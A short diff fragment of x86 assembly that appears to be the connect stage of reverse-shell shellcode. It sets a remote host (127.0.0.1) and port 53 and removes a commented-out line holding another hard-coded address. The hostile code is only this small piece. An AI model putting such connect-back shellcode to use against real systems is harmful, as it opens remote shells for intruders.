@@ -38,7 +38,6 @@ socket:
 
 connect:
 	pop  ebx
-;	push dword 0x03a0f280
 	push dword 0x0100007f ; RHOST
 	mov  dh, 0x35         ; RPORT (53)
 	push dx
